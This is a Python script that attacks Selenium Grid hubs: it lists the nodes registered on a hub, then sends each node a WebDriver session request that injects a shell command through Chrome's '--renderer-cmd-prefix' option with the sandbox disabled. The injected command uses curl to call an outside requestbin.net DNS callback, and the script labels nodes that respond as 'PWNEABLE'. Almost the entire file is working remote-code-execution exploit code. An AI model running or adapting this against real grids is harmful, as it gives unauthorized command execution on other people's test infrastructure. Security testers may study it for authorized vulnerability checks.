#!/bin/python3.7
import requests
import re
import base64
import asyncio
import websockets
import json
import time
import threading
import argparse

NODE_REGEX = re.compile(r'id:\s(https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,6})')

HUB_IP_ADDR="192.168.1.1" #default
HUB_PORT="4444" #default
REQUEST_TOKEN = ''
REQUEST_DOMAIN='.d.requestbin.net'
WEBSOCKET_URL     = "ws://dns.requestbin.net:8080/dnsbin";
RESULT_SET = {}

parser = argparse.ArgumentParser()
parser.add_argument("-a","--addr", help="Hub ip address")
parser.add_argument("-p","--port", help="Hub web panel port")
parser.add_argument("-e","--enumerate",action="store_true", help="Just eumerate nodes on hub")
args = parser.parse_args()

if args.addr:
    HUB_IP_ADDR = args.addr

if args.port:
    HUB_PORT = args.port

if not args.enumerate:
    async def read_bytes_from_outside():
        async with websockets.connect(WEBSOCKET_URL,close_timeout=3) as websocket:
            global REQUEST_TOKEN
            global RESULT_SET
            data = await websocket.recv()
            data = json.loads(data)
            REQUEST_TOKEN = data['data']
            print("[+] Current session token is : " + REQUEST_TOKEN)
            try:
                while(websocket.open):
                    message = await websocket.recv()
                    message = json.loads(json.loads(message)['data'])
                    node = message['content']
                    RESULT_SET[base64.b32decode(node.upper() + '=' * (-len(node) % 4)).decode('utf-8')]=message
            except:
                pass

    def thread_handler():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(read_bytes_from_outside())
        loop.close()

    thread = threading.Thread(target = thread_handler, args='')
    thread.start()


    while len(REQUEST_TOKEN)<1:
        time.sleep(0.2)

print("[+] Hub Location:",'http://'+HUB_IP_ADDR+':'+HUB_PORT)
r = requests.get('http://'+HUB_IP_ADDR+':'+HUB_PORT+'/grid/console')

NodesOnHub = NODE_REGEX.findall(r.content.decode("utf-8"))

if not args.enumerate:
    for node in NodesOnHub:
        b32_node = ""+base64.b32encode(str.encode(node)).decode('utf-8').replace('=','').lower()
        payload = "curl "+b32_node+"."+REQUEST_TOKEN+REQUEST_DOMAIN
        rce_test_data = '''{
            "desiredCapabilities": {
                "browserName":"chrome",
                "goog:chromeOptions": {
                    "args":["--no-sandbox","--renderer-cmd-prefix='''+payload+''' --"]
                }
            }
        }'''
        r = requests.post(url = 'http://'+HUB_IP_ADDR+':'+HUB_PORT+'/wd/hub/session', headers={'Content-Type':'text/plain;charset=UTF-8'}, data = rce_test_data)


    thread.join()

    print("[+] Nodes with RCE: ")
    for node in NodesOnHub:
        if node in RESULT_SET:
            print(" [\033[;1;32m+\033[;39;49m] ",node,"\033[;1;32mPWNEABLE!\033[;39;49m")
        else:
            print(" [\033[;1;31m-\033[;39;49m] ",node,"\033[;1;31mNOT PWNEABLE!\033[;39;49m")

else:
    print("[+] Nodes Subscribed to HUB: ")
    for node in NodesOnHub:
            print(" [*] ",node)
